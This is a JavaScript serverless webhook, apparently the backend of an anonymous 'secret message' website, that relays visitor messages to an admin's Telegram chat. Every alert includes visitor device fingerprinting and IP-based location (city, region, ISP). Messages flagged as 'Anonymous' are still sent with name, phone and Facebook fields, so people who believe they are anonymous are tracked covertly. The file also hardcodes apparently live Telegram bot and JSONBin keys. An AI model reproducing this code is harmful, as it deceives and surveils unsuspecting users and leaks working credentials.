// api/webhook.js - Vercel Serverless Function
// Handles incoming messages from website and sends to Telegram bot

const TELEGRAM_TOKEN = '8653934604:AAGE9O4iEkB62yxsXWEGOE2AS_TZNmmMxPA';
const ADMIN_CHAT_ID = '6048050987';
const JSONBIN_BIN_ID = '6a0165595d6c3911694c78bc';
const JSONBIN_KEY = '$2a$10$RcXzuT2PuYjBpDB1oL1SM.Qo3X2nQJrPlybj6gFmJEZot.wy8sUcm';
const JSONBIN_ACCESS = '$2a$10$JsBz0QBN/BL6kYnQxlchcOKyFGrxrW78.xTwcClsgwHu5OVFxrnFm';

const TG_API = `https://api.telegram.org/bot${TELEGRAM_TOKEN}`;

async function sendTelegram(method, body) {
  const res = await fetch(`${TG_API}/${method}`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify(body)
  });
  return res.json();
}

async function getJsonBin() {
  try {
    const r = await fetch(`https://api.jsonbin.io/v3/b/${JSONBIN_BIN_ID}/latest`, {
      headers: { 'X-Master-Key': JSONBIN_KEY, 'X-Access-Key': JSONBIN_ACCESS }
    });
    const d = await r.json();
    return d.record || { users: {}, replies: {} };
  } catch(e) { return { users: {}, replies: {} }; }
}

async function setJsonBin(data) {
  try {
    await fetch(`https://api.jsonbin.io/v3/b/${JSONBIN_BIN_ID}`, {
      method: 'PUT',
      headers: {
        'Content-Type': 'application/json',
        'X-Master-Key': JSONBIN_KEY,
        'X-Access-Key': JSONBIN_ACCESS
      },
      body: JSON.stringify(data)
    });
  } catch(e) {}
}

function formatDeviceInfo(dev) {
  if (!dev) return '';
  return [
    `📱 *Device Info:* ${dev.userAgent ? dev.userAgent.substring(0, 80) : 'Unknown'}`,
    `🔋 *Battery:* ${dev.charging || 'Unknown'} ${dev.chargeStatus || ''}`,
    `📶 *Network:* ${dev.online ? 'Online' : 'Offline'}`,
    `🌍 *IP:* \`${dev.ip || 'Unknown'}\``,
    `🏙️ *Country:* ${dev.country || 'Unknown'}`,
    `🏠 *Region:* ${dev.region || 'Unknown'}`,
    `🏡 *City:* ${dev.city || 'Unknown'}`,
    `📡 *ISP:* ${dev.isp || 'Unknown'}`,
    `💾 *RAM:* ${dev.ram || 'Unknown'} | *Cores:* ${dev.cores || 'Unknown'}`,
    `🖥️ *Screen:* ${dev.screen || 'Unknown'}`,
    `🧠 *Platform:* ${dev.platform || 'Unknown'}`
  ].join('\n');
}

export default async function handler(req, res) {
  // CORS
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
  if (req.method === 'OPTIONS') return res.status(200).end();

  if (req.method !== 'POST') return res.status(405).json({ error: 'Method not allowed' });

  try {
    const body = req.body;
    const db = await getJsonBin();
    const now = new Date();
    const timeStr = now.toLocaleString('en-BD', { timeZone: 'Asia/Dhaka' });

    // ===== NEW USER =====
    if (body.type === 'new_user') {
      db.users = db.users || {};
      db.users[body.userId] = {
        userId: body.userId,
        joinTime: body.timestamp,
        device: body.device,
        lastActive: body.timestamp
      };
      await setJsonBin(db);

      const devInfo = formatDeviceInfo(body.device);
      const msg = `🚨 *New User Alert!*\n\n` +
        `📅 *Time:* ${timeStr}\n` +
        `🆔 *User ID:* \`${body.userId}\`\n\n` +
        `${devInfo}`;

      await sendTelegram('sendMessage', {
        chat_id: ADMIN_CHAT_ID,
        text: msg,
        parse_mode: 'Markdown'
      });

      return res.status(200).json({ ok: true });
    }

    // ===== NEW MESSAGE =====
    if (body.type === 'message') {
      const msgId = Date.now().toString();
      db.users = db.users || {};
      if (db.users[body.userId]) {
        db.users[body.userId].lastActive = body.timestamp;
      }

      await setJsonBin(db);

      const devInfo = formatDeviceInfo(body.device);
      const anonBadge = body.anonymous ? '🎭 Anonymous' : '👤 Identified';

      const msg = `💌 *New Secret Message!*\n` +
        `━━━━━━━━━━━━━━━━━━━━\n` +
        `🆔 *User ID:* \`${body.userId}\`\n` +
        `${anonBadge}\n` +
        `👤 *Name:* ${body.name}\n` +
        `📱 *Phone:* ${body.phone}\n` +
        `🔗 *FB:* ${body.fb}\n` +
        `📅 *Time:* ${timeStr}\n` +
        `━━━━━━━━━━━━━━━━━━━━\n` +
        `📝 *Message:*\n${body.message}\n` +
        `━━━━━━━━━━━━━━━━━━━━\n` +
        `${devInfo}`;

      await sendTelegram('sendMessage', {
        chat_id: ADMIN_CHAT_ID,
        text: msg,
        parse_mode: 'Markdown',
        reply_markup: {
          inline_keyboard: [[
            {
              text: '💬 Reply to User',
              callback_data: `reply_${body.userId}`
            }
          ]]
        }
      });

      return res.status(200).json({ ok: true, msgId });
    }

    // ===== NEW CAPTION =====
    if (body.type === 'new_caption') {
      const msg = `✨ *New Caption Added!*\n\n` +
        `🆔 *User ID:* \`${body.userId}\`\n` +
        `📅 *Time:* ${timeStr}\n\n` +
        `💭 *Caption:*\n${body.caption}`;

      await sendTelegram('sendMessage', {
        chat_id: ADMIN_CHAT_ID,
        text: msg,
        parse_mode: 'Markdown'
      });

      return res.status(200).json({ ok: true });
    }

    return res.status(400).json({ error: 'Unknown type' });

  } catch(e) {
    console.error(e);
    return res.status(500).json({ error: 'Internal error' });
  }
}
